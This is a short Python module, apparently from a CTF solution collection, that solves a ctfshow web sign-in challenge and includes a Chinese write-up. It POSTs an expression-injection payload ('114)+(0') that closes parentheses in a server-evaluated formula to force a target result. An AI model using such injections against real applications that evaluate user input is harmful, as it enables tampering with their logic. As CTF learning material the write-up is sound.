 # -*- coding: utf-8 -*-
def info():
	info={
"questname":"webqiandao",
"platform":"ctfshow",
"contest" : "blb(bai lan bei)",
"description":"ctfshow blb web qian dao.",
"requirements":"python requests",
"module options":[
	{"name":"url","required":True,"description":"full url."},
	]
}
	return(info)

def exploit(options):
	url=options['url']
	import requests
	if url[:7]!="http://" :
		url='http://'+url
	payload={"A":"114)+(0","B":"1","C":"-1"}
	r=requests.post(url,data=payload)
	print(r.content.decode())
	return("套神做完了，并告诉你这是一个烂题")


def make_wp():
	wp="""
根据题目可知，要输入三非0数字，使得结果为114，简单尝试一下就知道这几乎是不可能的，那么只能从程序逻辑上看有没有漏洞可钻了。

输入数字可以发现计算公式，输入其他字符会提示hacker，输入+-*（）和数字则不会提示非法，而是会把算式列出来，或者算式没法算就直接摆烂。
所以很简单的就可以想到，闭合括号运算，让算式的值为114就可以了。

payload（参考）：

A=114)+(0&B=1&C=-1
"""
	return(wp)
	